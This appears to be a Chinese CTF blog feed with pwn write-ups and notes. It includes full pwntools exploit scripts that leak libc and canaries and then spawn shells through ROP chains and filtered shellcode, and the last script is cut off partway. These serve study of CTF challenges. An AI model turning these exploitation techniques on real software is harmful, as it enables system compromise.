class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">from</span> LibcSearcher <span class="hljs-keyword">import</span> *<br>context(arch=<span class="hljs-string">&#x27;amd64&#x27;</span>, os=<span class="hljs-string">&#x27;linux&#x27;</span>, log_level=<span class="hljs-string">&#x27;debug&#x27;</span>)<br><br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>exe = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>        <span class="hljs-keyword">if</span> args.GDB:<br>            gdb.attach(io)<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path], <span class="hljs-string">&quot;b *main&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-comment"># nc pwn.challenge.ctf.show 28213</span><br>        <span class="hljs-comment">#  47.93.96.189 20511</span><br>        io = remote(<span class="hljs-string">&#x27;47.94.103.208&#x27;</span>, <span class="hljs-number">24586</span>)<br>    <span class="hljs-keyword">return</span> io<br><br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io<br>    io = conn()<br>    offset = <span class="hljs-number">0x218</span> + <span class="hljs-number">4</span><br>    puts_got = exe.got[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    puts_plt = exe.plt[<span class="hljs-string">&#x27;puts&#x27;</span>]<br>    <span class="hljs-comment"># fgetc_got = exe.got[&#x27;fgetc&#x27;]</span><br>    <span class="hljs-comment"># __libc_start_main_got = exe.got[&#x27;__libc_start_main&#x27;]</span><br>    add_rsi = <span class="hljs-number">0x04010EB</span><br>    reset_rsi = <span class="hljs-number">0x04010E4</span><br>    mov_rdi_rsi = <span class="hljs-number">0x0401180</span> <br>    main = exe.symbols[<span class="hljs-string">&#x27;main&#x27;</span>]<br>    _rbp_ = puts_got - <span class="hljs-number">0x20</span><br><br>    <span class="hljs-comment"># --------------- edit buffer mode ---------------</span><br>    revenge = exe.symbols[<span class="hljs-string">&#x27;revenge&#x27;</span>]<br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + <span class="hljs-string">b&#x27;\x28&#x27;</span> + p64(main)<br><br>    <span class="hljs-comment"># --------------- leak libc ---------------</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + <span class="hljs-string">b&#x27;\x28&#x27;</span> + p64(reset_rsi) + p64(add_rsi) + p64(mov_rdi_rsi) + p64(puts_plt) + p64(main) + p64(puts_got) <br>    io.sendline(payload)<br><br>    <span class="hljs-comment"># --------------- brute buffer ---------------</span><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + <span class="hljs-string">b&#x27;\x28&#x27;</span> + p64(main)<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">228</span>):<br>        io.sendline(payload)<br>    recv_bytes = io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)[-<span class="hljs-number">6</span>:]<br>    puts_addr = u64(recv_bytes.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    log.success(<span class="hljs-string">&#x27;puts_addr: &#x27;</span> + <span class="hljs-built_in">hex</span>(puts_addr))<br><br>    libc = LibcSearcher(<span class="hljs-string">&#x27;puts&#x27;</span>,  puts_addr)<br>    libc.select_libc(<span class="hljs-number">9</span>)<br>    libc_base = puts_addr - libc.dump(<span class="hljs-string">&#x27;puts&#x27;</span>)<br>    <br><br>    <span class="hljs-comment"># --------------- exp ---------------</span><br>    ret = <span class="hljs-number">0x040101a</span><br>    system_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;system&#x27;</span>)<br>    binsh_addr = libc_base + libc.dump(<span class="hljs-string">&#x27;str_bin_sh&#x27;</span>)<br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span> * offset + <span class="hljs-string">b&#x27;\x28&#x27;</span> + p64(reset_rsi) + p64(add_rsi) + p64(mov_rdi_rsi) + p64(ret) + p64(system_addr) + p64(binsh_addr)<br>    io.sendline(payload)<br>    <br>    <span class="hljs-comment"># recv_bytes = io.recvuntil(b&#x27;\x7f&#x27;)</span><br>    <span class="hljs-comment"># log.info(recv_bytes)</span><br>    io.interactive()<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><h1 id="web苦手"><a href="#web苦手" class="headerlink" title="web苦手"></a>web苦手</h1><blockquote><p>逆向巨恶心， 不如叫逆向苦手</p></blockquote><h1 id="girlfriend"><a href="#girlfriend" class="headerlink" title="girlfriend"></a>girlfriend</h1><p>非常有用的格式化字符串漏洞<br>在replay()函数中：<br><img src="/2024/10/29/hello-world/file-20250407001256314.png"></p><p>可以泄露出pie基址、<code>__libc_start_call_main</code>地址、rbp中的值（<code>main</code>函数的rbp）、canary</p><p>第一次实验<br><img src="/2024/10/29/hello-world/file-20250405224110738.png"><br><img src="/2024/10/29/hello-world/file-20250405224154344.png"></p><p>第二次实验<br><img src="/2024/10/29/hello-world/file-20250405224350590.png"><br><img src="/2024/10/29/hello-world/file-20250405224420020.png"></p><p>第一次调试<br><img src="/2024/10/29/hello-world/file-20250406011539333.png"><br><img src="/2024/10/29/hello-world/file-20250406011644146.png"></p><p>布置栈布置了半天也没成功，我的思路是在栈上布置rop链，总是差一点，应该不是正确解法</p>]]></content>
    
    
    <categories>
      
      <category>WP</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>认证访问github</title>
    <link href="/2025/04/03/%E8%AE%A4%E8%AF%81%E8%AE%BF%E9%97%AEgithub/"/>
    <url>/2025/04/03/%E8%AE%A4%E8%AF%81%E8%AE%BF%E9%97%AEgithub/</url>
    
    <content type="html"><![CDATA[<p>github已经移除了账号-密码的认账方式</p><h1 id="使用个人访问令牌（PAT）"><a href="#使用个人访问令牌（PAT）" class="headerlink" title="使用个人访问令牌（PAT）"></a>使用个人访问令牌（PAT）</h1><h1 id="使用ssh连接"><a href="#使用ssh连接" class="headerlink" title="使用ssh连接"></a>使用ssh连接</h1>]]></content>
    
    
    <categories>
      
      <category>chore</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>pwn自动化更改libc</title>
    <link href="/2025/04/02/pwn%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9B%B4%E6%94%B9libc/"/>
    <url>/2025/04/02/pwn%E8%87%AA%E5%8A%A8%E5%8C%96%E6%9B%B4%E6%94%B9libc/</url>
    
    <content type="html"><![CDATA[<h1 id="原始方法"><a href="#原始方法" class="headerlink" title="原始方法"></a>原始方法</h1><p><a href="%E6%9B%B4%E6%94%B9pwn%E9%A2%98libc.md">更改pwn题libc</a></p><hr><h1 id="pwninit"><a href="#pwninit" class="headerlink" title="pwninit"></a>pwninit</h1><p>项目地址：<a href="https://github.com/io12/pwninit">io12&#x2F;pwninit: pwninit - automate starting binary exploit challenges</a><br>参考文章：<a href="https://blog.csdn.net/gitblog_00170/article/details/144136469">pwninit项目常见问题解决方案-CSDN博客</a></p><p>功能：</p><hr><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">cargo install pwninit<br></code></pre></td></tr></table></figure><hr><h2 id="使用pwninit自动化"><a href="#使用pwninit自动化" class="headerlink" title="使用pwninit自动化"></a>使用pwninit自动化</h2><p>将相关的二进制文件、库文件放置在同一个目录下<br>执行</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwninit<br></code></pre></td></tr></table></figure><p>pwninit将自动检测并准备所需的文件<br>若检测失败，可手动指定文件路径</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sh">pwninit --bin &lt;binary_path&gt; --libc &lt;libc_path&gt; --ld &lt;ld_path&gt; <br></code></pre></td></tr></table></figure><hr><h2 id="自定义pwninit使用的模板脚本"><a href="#自定义pwninit使用的模板脚本" class="headerlink" title="自定义pwninit使用的模板脚本"></a>自定义pwninit使用的模板脚本</h2><p><code>~/.config/</code>下写个脚本，并在<code>~/.zshrc</code>中添加配置</p><hr><h1 id="cpwn"><a href="#cpwn" class="headerlink" title="cpwn"></a>cpwn</h1><blockquote><p>参见项目地址即可：<a href="https://github.com/GeekCmore/cpwn">GeekCmore&#x2F;cpwn: A tool to initialize pwn game exploit enviroment.</a></p></blockquote><hr><h1 id="clibc"><a href="#clibc" class="headerlink" title="clibc"></a>clibc</h1><blockquote><p>在前两种方法中，都有一个共同的缺陷，就是它们的patchelf步骤都只是下载更改libc和ld，并不能做到应对一些其它库也需要更改的情况，比如libdl</p></blockquote><p>原理：<br>利用了<code>patchelf</code>的<code>-set-interpreter</code>和<code>-set-rpath</code>两个命令</p>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>整数安全</title>
    <link href="/2025/03/31/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/"/>
    <url>/2025/03/31/%E6%95%B4%E6%95%B0%E5%AE%89%E5%85%A8/</url>
    
    <content type="html"><![CDATA[<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">scanf</span>(<span class="hljs-string">&quot;%[^\n]&quot;</span>, buffer);<br></code></pre></td></tr></table></figure><p><code>%[^\n]</code>格式符用于从输入流中读取一行字符串，直到遇到换行符为止<br>换行符本身不会被读取，而是留在输入缓冲区中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">memcpy</span><span class="hljs-params">(<span class="hljs-type">void</span> *dest, <span class="hljs-type">const</span> <span class="hljs-type">void</span> *src, <span class="hljs-type">size_t</span> n)</span>;<br></code></pre></td></tr></table></figure><p><code>dest</code>：目标内存地址（指向要写入数据的内存块）<br><code>src</code>：源内存地址（指向要复制的数据块）<br><code>n</code>：要复制的字节数</p><hr><p>整数溢出：</p><ul><li>两个长度不同的整数之间进行赋值，长赋短，会发生溢出  信息发生改变</li><li>有符号数转无符号数 类型转换      信息发生改变</li></ul><p>我觉得不如说是类型溢出</p><p>基于C语言不同类型间的转换与操作出现的信息改变 进而导致攻击者可以利用代码书写者没有注意到的信息转换点进行控制、攻击程序</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">atoi</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">char</span> *str)</span>;<br></code></pre></td></tr></table></figure><p>将数字字符转化为数字</p><ul><li>它会跳过字符串开头的空白字符（如空格、制表符等），然后读取尽可能多的数字字符，直到遇到非数字字符或字符串结束。<br>返回值</li><li>返回转换后的整数值。</li><li>如果字符串无法转换为整数（例如，字符串不包含有效的数字），<code>atoi</code> 返回 0。</li></ul><hr><p><img src="/2024/10/29/hello-world/250402122132788.png"><br>在这里会产生整数溢出</p><h1 id="C语言中的类型"><a href="#C语言中的类型" class="headerlink" title="C语言中的类型"></a>C语言中的类型</h1>]]></content>
    
    
    <categories>
      
      <category>pwn</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>house of apple</title>
    <link href="/2025/03/31/house-of-apple/"/>
    <url>/2025/03/31/house-of-apple/</url>
    
    <content type="html"><![CDATA[<p>条件：</p><ol><li>从<code>main</code>函数返回或能调用<code>exit</code>函数</li><li>能泄漏出<code>heap</code>地址<strong>和</strong><code>exit</code>地址</li><li>能使用<strong>一次</strong><code>largebin attack</code></li></ol><p>当程序从<code>main</code>函数返回或执行<code>exit</code>函数时，均会调用<code>fcloseall</code>函数<br>该调用链为：</p><ul><li>exit<ul><li>fcloseall<ul><li>_IO_cleanup<ul><li>_IO_flush_all_lockp_<ul><li>_IO_OVERFLOW</li></ul></li></ul></li></ul></li></ul></li></ul><p>最后会遍历<code>_IO_list_all</code>存放的每一个<code>IO_FILE</code>结构体，如果满足条件的话，会调用每个结构体中<code>vtable-&gt;_overflow</code>函数指针指向的函数</p><p>使用<code>largebin attack</code>可以劫持<code>_IO_list_all</code>变量，将其替换为伪造的<code>IO_FILE</code>结构体，而在此时，我们仍可以继续利用某些<code>IO</code>流函数去修改其它地方的值。要想修改其它地方的值，就离不开<code>_IO_FILE</code>的一个成员<code>_wide_data</code>的利用</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>whuctf2025-wp与复现</title>
    <link href="/2025/03/29/whuctf-2025/"/>
    <url>/2025/03/29/whuctf-2025/</url>
    
    <content type="html"><![CDATA[<h1 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1><hr><h1 id="repeater"><a href="#repeater" class="headerlink" title="repeater"></a>repeater</h1><p>利用思路：</p><ol><li>泄漏canary</li><li>泄漏泄漏调用程序主体的<code>__libc_start_call_main+128</code>函数地址</li><li>根据<code>__libc_start_call_main+128</code>地址和libc中固定的相对偏移计算出函数<code>__libc_start_main</code>函数地址，进而计算出libc基址</li><li>覆盖程序返回值，调用<code>system</code>拿到shell</li></ol><p>泄漏出<code>main</code>函数返回地址：<code>__libc_start_call_main</code>函数地址<br><img src="/2024/10/29/hello-world/file-20250329120856948.png"><br>根据相对偏移计算出libc_base</p><p><img src="/2024/10/29/hello-world/file-20250331145534337.png"><br><img src="/2024/10/29/hello-world/file-20250331145717579.png"><br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>exe = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br>libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(<span class="hljs-string">&quot;125.220.147.47&quot;</span>, <span class="hljs-number">49357</span>)<br>        <span class="hljs-comment"># 125.220.147.47:49357</span><br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        gdb.attach(io, cmd)<br>        pause()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">choice</span>(<span class="hljs-params">i</span>):<br>    io.sendlineafter(<span class="hljs-string">b&#x27;3. exit&#x27;</span>, <span class="hljs-built_in">str</span>(i).encode())<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io <br>    io = conn()<br><br>    choice(<span class="hljs-number">1</span>)<br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;B&#x27;</span><br>    io.send(payload)<br>    choice(<span class="hljs-number">2</span>)<br><br>    io.recvuntil(<span class="hljs-string">b&#x27;B&#x27;</span>)<br>    cana_bytes = io.recv(<span class="hljs-number">7</span>)<br>    log.success(<span class="hljs-string">f&#x27;cana_bytes: <span class="hljs-subst">&#123;cana_bytes&#125;</span>&#x27;</span>)<br><br>    <span class="hljs-comment"># ------------------------- canary -------------------------</span><br><br><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x20</span> + <span class="hljs-string">b&#x27;deadbeef&#x27;</span><br>    choice(<span class="hljs-number">1</span>)<br>    io.send(payload)<br>    choice(<span class="hljs-number">2</span>)<br>    <span class="hljs-comment"># dbg(&#x27;b&#x27;)</span><br><br>    io.recvuntil(<span class="hljs-string">b&#x27;deadbeef&#x27;</span>)<br>    data = io.recvuntil(<span class="hljs-string">b&#x27;\x7f&#x27;</span>)<br>    pie_call_main = u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>    call_main = pie_call_main - <span class="hljs-number">128</span><br>    libc_base = call_main + <span class="hljs-number">0xb0</span> - libc.symbols[<span class="hljs-string">&#x27;__libc_start_main&#x27;</span>]<br><br>    <span class="hljs-comment"># ------------------------- libc -------------------------</span><br><br><br>    sys = libc_base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>    <span class="hljs-built_in">bin</span> = libc_base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br><br><br>    pop_rdi_offset = <span class="hljs-number">0x000000000002a3e5</span><br>    pop_rdi = libc_base + pop_rdi_offset<br><br><br>    payload = <span class="hljs-string">b&#x27;A&#x27;</span>* <span class="hljs-number">0x18</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span> + cana_bytes + <span class="hljs-string">b&#x27;deadbeef&#x27;</span> +p64(pop_rdi+<span class="hljs-number">1</span>) + p64(pop_rdi) + p64(<span class="hljs-built_in">bin</span>) + p64(sys)<br>    choice(<span class="hljs-number">1</span>)<br>    io.send(payload)<br><br>    choice(<span class="hljs-number">3</span>)<br>    io.interactive()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>刚开始canary地址偏移写错了，刚好也能泄漏，我以为那就是canary，直接卡了我一早上</p><hr><h1 id="shell-for-shell"><a href="#shell-for-shell" class="headerlink" title="shell_for_shell"></a>shell_for_shell</h1><p>mmap()函数<br>linux系统中的一个函数，用于将文件或设备映射到内存中，从而允许程序通过内存访问文件内容，而不需要使用传统的文件I&#x2F;O操作（<code>read</code>和<code>write</code>）</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">void</span> *<span class="hljs-title function_">mmap</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> length, <span class="hljs-type">int</span> prot, <span class="hljs-type">int</span> flags, <span class="hljs-type">int</span> fd, <span class="hljs-type">off_t</span> offset)</span><br></code></pre></td></tr></table></figure><p>addr：<br>指定映射的内存起始地址。<br>如果为<code>NULL</code>，系统会自动选择一个合适的地址<br>如果指定了地址，<code>flags</code>中需要包含<code>MAP_FIXED</code><br>length:<br>映射内存区域的访问权限，可以是以下值的组合<br><code>PROT_NONE</code>：不能访问<br><code>PROT_READ</code>：可读<br><code>PROT_WRITE</code>：可写<br><code>PROT_EXEC</code>：可执行<br>flags<br>指定映射的类型和行为<br>有私有映射，共享映射，匿名映射<br>fd<br>文件描述符<br>可由open返回<br>offset<br>文件映射的起始偏移量</p><p>返回值：<br>返回映射的内存地址</p><hr><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> <span class="hljs-title function_">mprotect</span><span class="hljs-params">(<span class="hljs-type">void</span>* addr, <span class="hljs-type">size_t</span> len, <span class="hljs-type">int</span> prot)</span><br></code></pre></td></tr></table></figure><p>addr：</p><ul><li>指向需要修改权限的内存区域的起始地址</li><li>该地址必须是<strong>页面大小的整数倍</strong>（如果传参不是页面大小的整数倍的话就会失败！！）<br>len：</li><li>要修改权限的内存区域的长度（以字节为单位）</li><li>实际修改的内存区域会向上取整到页面大小的倍数<br>prot：</li><li>指定新的访问权限，可以是以下标志的组合<ul><li><code>PROT_NONE</code>：禁止访问</li><li><code>PROT_READ</code>：可读 1</li><li><code>PROT_WRITE</code>：可写 2</li><li><code>PROT_EXEC</code>：可执行 4</li></ul></li></ul><p>返回值：</p><ul><li>成功时返回0</li><li>失败时返回-1，并设置<code>errno</code>以指示错误原因</li></ul><hr><p>\键可简化ida界面显示信息</p><hr><p>编写shellcode</p><p>一开始我尝试找到能够绕过<code>\x0f</code> <code>\x05</code>检查并不需要在执行的过程中写指令就能拿到shell的shellcode<br>从网上看到了一个<code>retfq</code>+<code>int 0x80</code>的，结果是没有尝试成功</p><p>然后采用mprotect修改内存权限并在执行时写入异或逻辑运算得到的syscall指令的操作，成功拿到了shell</p><p>exp：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">import</span> os<br>context(arch = <span class="hljs-string">&#x27;amd64&#x27;</span>,os = <span class="hljs-string">&#x27;linux&#x27;</span>,log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><span class="hljs-keyword">if</span> os.environ.get(<span class="hljs-string">&quot;ZELLIJ&quot;</span>) == <span class="hljs-string">&quot;0&quot;</span>:<br>    context.terminal = [<br>        <span class="hljs-string">&quot;zellij&quot;</span>,<br>        <span class="hljs-string">&quot;action&quot;</span>,<br>        <span class="hljs-string">&quot;new-pane&quot;</span>,<br>        <span class="hljs-string">&quot;-d&quot;</span>,<br>        <span class="hljs-string">&quot;right&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>        <span class="hljs-string">&quot;--&quot;</span>,<br>        <span class="hljs-string">&quot;bash&quot;</span>,<br>        <span class="hljs-string">&quot;-c&quot;</span>,<br>    ]<br><br>exe = ELF(<span class="hljs-string">&quot;./pwn&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">conn</span>():<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        io = process([exe.path])<br>    <span class="hljs-keyword">elif</span> args.GDB:<br>        io = gdb.debug([exe.path])<br>    <span class="hljs-keyword">else</span>:<br>        io = remote(<span class="hljs-string">&quot;125.220.147.47&quot;</span>, <span class="hljs-number">49547</span>)<br>        <span class="hljs-comment"># 125.220.147.47:49445</span><br>    <span class="hljs-keyword">return</span> io<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dbg</span>(<span class="hljs-params">cmd=<span class="hljs-string">&quot;&quot;</span></span>):<br>    <span class="hljs-keyword">if</span> args.LOCAL:<br>        gdb.attach(io, cmd)<br>        pause()<br><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">global</span> io   <br>    io = conn()<br><br>    shellcode = asm(<br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        add al,al</span><br><span class="hljs-string">        mov rsp, 0x404068</span><br><span class="hljs-string">        mov rbp, 0x404068</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br>    )<br><br>    shellcode += asm(<br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mov rdi, 0x404000</span><br><span class="hljs-string">        mov rsi, 0x1000</span><br><span class="hljs-string">        mov rdx, 7</span><br><span class="hljs-string">        mov rax, 0x401070</span><br><span class="hljs-string">        call rax</span><br><span class="hljs-string">        /* push b&#x27;/bin///sh\x00&#x27; */</span><br><span class="hljs-string">        push 0x68</span><br><span class="hljs-string">        mov rax, 0x732f2f2f6e69622f</span><br><span class="hljs-string">        push rax</span><br><span class="hljs-string">        mov rdi, rsp</span><br><span class="hljs-string">        /* push argument array [&#x27;sh\x00&#x27;] 